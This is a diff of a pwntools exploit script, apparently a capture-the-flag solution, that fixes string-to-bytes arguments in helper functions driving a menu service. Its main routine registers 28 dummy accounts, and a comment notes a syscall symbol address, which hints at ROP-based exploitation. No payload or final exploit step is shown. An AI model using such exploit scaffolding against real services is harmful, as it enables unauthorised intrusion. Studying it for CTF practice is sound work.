@@ -6,7 +6,7 @@ import pwn
 
 
 def register(io: pwn.tube, username: bytes, password: bytes, protection: bytes) -> None:
-    io.sendlineafter(b'> ', 'REGISTER')
+    io.sendlineafter(b'> ', b'REGISTER')
 
     io.sendlineafter(b': ', username)
     io.sendlineafter(b': ', password)
@@ -16,7 +16,7 @@ def register(io: pwn.tube, username: bytes, password: bytes, protection: bytes) 
 
 
 def login(io: pwn.tube, username: bytes, password: bytes) -> None:
-    io.sendlineafter(b'> ', 'LOGIN')
+    io.sendlineafter(b'> ', b'LOGIN')
 
     io.sendlineafter(b': ', username)
     io.sendlineafter(b': ', password)
@@ -25,13 +25,13 @@ def login(io: pwn.tube, username: bytes, password: bytes) -> None:
 
 
 def info(io: pwn.tube) -> bytes:
-    io.sendlineafter(b'> ', 'INFO')
+    io.sendlineafter(b'> ', b'INFO')
 
     return io.recvline()[4:]
 
 
 def update(io: pwn.tube, description: bytes) -> None:
-    io.sendlineafter(b'> ', 'UPDATE')
+    io.sendlineafter(b'> ', b'UPDATE')
 
     io.sendlineafter(b': ', description)
 
@@ -39,13 +39,13 @@ def update(io: pwn.tube, description: bytes) -> None:
 
 
 def logout(io: pwn.tube) -> None:
-    io.sendlineafter(b'> ', 'LOGOUT')
+    io.sendlineafter(b'> ', b'LOGOUT')
 
     return
 
 
 def exit(io: pwn.tube) -> None:
-    io.sendlineafter(b'> ', 'EXIT')
+    io.sendlineafter(b'> ', b'EXIT')
 
     return
 
@@ -59,7 +59,7 @@ def main() -> None:
     # 0000000000402680 T syscall.RawSyscall6
 
     for i in range(28):
-        register(io, f'x_{i}'.format(i), b'x', b'full')
+        register(io, f'x_{i}'.encode(), b'x', b'full')
         logout(io)
 
     register(io, b'x', b'x', b'full')
